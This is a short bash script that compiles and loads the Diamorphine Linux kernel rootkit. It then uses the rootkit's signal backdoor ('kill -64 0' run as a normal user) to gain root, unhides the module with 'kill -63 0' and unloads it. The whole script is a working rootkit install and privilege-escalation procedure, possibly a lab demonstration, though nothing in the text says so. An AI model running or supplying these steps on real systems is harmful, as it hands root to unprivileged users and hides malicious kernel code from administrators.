#!/bin/bash
echo "compiling diamorphine.ko"
cd Diamorphine/
make
echo "loading diamorphine.ko"
insmod diamorphine.ko
echo "escalating privileges as normal user"
runuser -l newuser -c 'kill -64 0'
sleep 1
echo "unhiding rootkit"
kill -63 0
echo "removing diamorphine.ko"
rmmod diamorphine